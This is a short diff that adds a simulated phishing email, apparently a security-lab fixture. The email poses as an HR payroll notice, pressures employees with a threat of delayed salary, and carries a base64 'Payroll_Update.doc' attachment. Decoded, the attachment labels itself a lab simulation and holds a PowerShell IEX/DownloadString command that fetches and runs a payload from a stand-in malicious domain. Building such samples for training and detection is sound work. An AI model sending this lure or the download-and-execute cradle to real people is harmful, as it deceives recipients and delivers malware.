@@ -1,0 +1,10 @@
+Dear Employee,
+
+Please review the attached payroll update document and confirm your information.
+Failure to respond may result in delayed salary processing.
+Regards, HR Department
+
+--boundary123 
+Content-Type: application/octet-stream; name="Payroll_Update.doc" Content-Disposition: attachment; filename="Payroll_Update.doc" Content-Transfer-Encoding: base64
+VGhpcyBpcyBhIHNpbXVsYXRlZCBtYWxpY2lvdXMgZmlsZSBmb3IgbGFicy4gUG93ZXJTaGVsbCBjb21tYW5kOiBwb3dlcnNoZWxsIC1jb21tYW5kICJJRVggKG5ldC53ZWIuY2xpZW50KS5Eb3dubG9hZFN0cmluZygn aHR0cDovL21hbGljaW91cy1kb21haW4uY29tL3BheWxvYWQnKSI=
+--boundary123--
